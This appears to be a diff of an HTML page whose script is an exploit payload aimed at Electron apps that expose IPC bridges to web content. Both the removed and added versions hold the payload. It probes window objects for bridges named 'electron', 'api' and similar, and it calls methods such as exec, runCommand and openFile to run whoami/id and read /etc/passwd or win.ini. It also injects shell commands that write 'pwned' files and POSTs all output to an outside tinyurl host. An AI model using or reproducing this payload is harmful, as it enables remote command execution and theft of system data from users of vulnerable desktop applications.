@@ -1,27 +1,52 @@
 <!DOCTYPE html>
 <body>
   <script>
-    // Check if the vulnerable API is exposed
-    if (window.api && window.api.runCommand) {
-      // Execute OS command and exfiltrate output
-      window.api.runCommand('whoami && curl https://tinyurl.com/yz885dsu/$(whoami)')
-        .then(output => {
-          // Optional: Send command output to your server
-          fetch('https://tinyurl.com/yz885dsu/result', {
-            method: 'POST',
-            body: output
-          });
-        })
-        .catch(error => {
-          fetch('https://tinyurl.com/yz885dsu/error', {
-            method: 'POST',
-            body: error.message
-          });
-        });
-    } else {
-      // Fallback: Alert the user (for demonstration)
-      alert('Vulnerable API not found!');
+    const SERVER = 'https://tinyurl.com/yz885dsu'; // Replace this!
+
+    // 1. Dump window properties
+    const keys = Object.keys(window).filter(k => typeof window[k] === 'object');
+    fetch(`${SERVER}/window`, { method: 'POST', body: JSON.stringify(keys) });
+
+    // 2. Check for common IPC objects
+    const suspects = ['electron', 'ipc', 'bridge', 'api', 'main'];
+    suspects.forEach(name => {
+      if (window[name]) {
+        fetch(`${SERVER}/hit?name=${name}`);
+      }
+    });
+
+    // 3. Test IPC methods
+    const methodsToTest = ['send', 'invoke', 'openFile', 'exec'];
+    if (window.electron) {
+      methodsToTest.forEach(method => {
+        if (typeof window.electron[method] === 'function') {
+          const cmd = navigator.platform.includes('Win') ? 'whoami' : 'id';
+          window.electron[method](cmd)
+            .then(output => fetch(`${SERVER}/${method}`, { body: output }))
+            .catch(e => fetch(`${SERVER}/error`, { body: e.message }));
+        }
+      });
     }
+
+    // 4. File read and command injection
+    const isWindows = navigator.platform.includes('Win');
+    const filePath = isWindows ? 'C:\\Windows\\win.ini' : '/etc/passwd';
+    const payload = isWindows ? '& whoami > C:\\pwned.txt' : '$(id > /tmp/pwned)';
+
+    if (window.api?.openFile) {
+      // Read file
+      window.api.openFile(filePath)
+        .then(data => fetch(`${SERVER}/file`, { body: data }))
+        .catch(e => {});
+
+      // Command injection
+      window.api.openFile(payload)
+        .catch(e => {});
+    }
+
+    // 5. System info
+    const sysInfo = { /* ... */ };
+    fetch(`${SERVER}/sysinfo`, { method: 'POST', body: JSON.stringify(sysInfo) });
   </script>
 </body>
 </html>
